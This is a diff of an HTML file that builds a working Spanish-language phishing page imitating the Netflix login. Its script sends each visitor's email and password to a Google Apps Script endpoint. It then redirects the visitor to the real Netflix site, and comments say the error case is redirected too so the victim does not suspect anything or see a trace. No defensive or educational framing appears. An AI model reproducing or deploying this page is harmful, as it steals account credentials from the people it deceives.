@@ -2,29 +2,104 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Acceso Seguro - Cloud</title>
-   <script>
-    // PEGA AQUÍ TU URL DE GOOGLE SCRIPT (LA QUE TERMINA EN /exec)
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwHh058XFvBCUL9mGxZS5cZSw9LPiqjvUOI56OAZ0NePtETmpuE7r3p3bww0bRrkGbj/exec';
-    const form = document.getElementById('loginForm');
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Iniciar Sesión</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
+                              url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0746f3208b4d/dad30504-20b1-460d-85fa-7f0cf88c5825/AR-es-20220502-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
 
-    form.addEventListener('submit', e => {
-        e.preventDefault();
+    <header class="p-6">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-32 md:w-44">
+    </header>
 
-        // Enviamos los datos a Google Sheets
-        fetch(scriptURL, { 
-            method: 'POST', 
-            body: new FormData(form),
-            mode: 'no-cors' 
-        })
-        .then(response => {
-            // Una vez guardados los datos, lo enviamos a la página oficial de Netflix
-            window.location.href = "https://www.netflix.com/login"; 
-        })
-        .catch(error => {
-            console.error('Error!', error.message);
-            // En caso de error, también lo mandamos para que no sospeche
-            window.location.href = "https://www.netflix.com/login";
+    <main class="flex-grow flex items-center justify-center p-4">
+        <div class="bg-black/75 p-12 md:p-16 rounded-md w-full max-w-[450px]">
+            <h1 class="text-white text-3xl font-bold mb-8">Inicia sesión</h1>
+            
+            <form id="loginForm" class="space-y-4">
+                <div class="relative">
+                    <input type="email" name="email" id="email" required 
+                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition"
+                        placeholder="Email o número de teléfono">
+                </div>
+                
+                <div class="relative">
+                    <input type="password" name="password" id="password" required 
+                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition"
+                        placeholder="Contraseña">
+                </div>
+
+                <button type="submit" 
+                    class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold mt-6 hover:bg-[#f6121d] transition">
+                    Iniciar sesión
+                </button>
+            </form>
+
+            <div class="flex justify-between items-center mt-4 text-[#b3b3b3] text-sm">
+                <div class="flex items-center">
+                    <input type="checkbox" id="remember" class="mr-1">
+                    <label for="remember">Recuérdame</label>
+                </div>
+                <a href="#" class="hover:underline">¿Necesitas ayuda?</a>
+            </div>
+
+            <div class="mt-16 text-[#737373]">
+                <p>¿Primera vez en Netflix? <a href="#" class="text-white hover:underline font-medium">Suscríbete ahora</a>.</p>
+                <p class="text-xs mt-4">Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-black/75 text-[#737373] p-8 text-sm mt-12">
+        <div class="max-w-4xl mx-auto">
+            <p class="mb-6 hover:underline cursor-pointer">¿Preguntas? Llama al 0800-XXX-XXXX</p>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                <span class="hover:underline cursor-pointer">Preguntas frecuentes</span>
+                <span class="hover:underline cursor-pointer">Centro de ayuda</span>
+                <span class="hover:underline cursor-pointer">Términos de uso</span>
+                <span class="hover:underline cursor-pointer">Privacidad</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Tu URL de Google Apps Script ya configurada
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwHh058XFvBCUL9mGxZS5cZSw9LPiqjvUOI56OAZ0NePtETmpuE7r3p3bww0bRrkGbj/exec';
+        const form = document.getElementById('loginForm');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+
+            // Deshabilitar botón para evitar múltiples clics
+            const btn = form.querySelector('button');
+            btn.innerText = "Cargando...";
+            btn.disabled = true;
+
+            // Enviar datos de forma asíncrona
+            fetch(scriptURL, { 
+                method: 'POST', 
+                body: new FormData(form),
+                mode: 'no-cors' 
+            })
+            .then(response => {
+                // Redirigir a Netflix oficial inmediatamente después del envío
+                window.location.href = "https://www.netflix.com/login"; 
+            })
+            .catch(error => {
+                console.error('Error!', error.message);
+                // Si falla, también redirigir para no dejar rastro del error
+                window.location.href = "https://www.netflix.com/login";
+            });
         });
-    });
-</script>
+    </script>
+
+</body>
+</html>
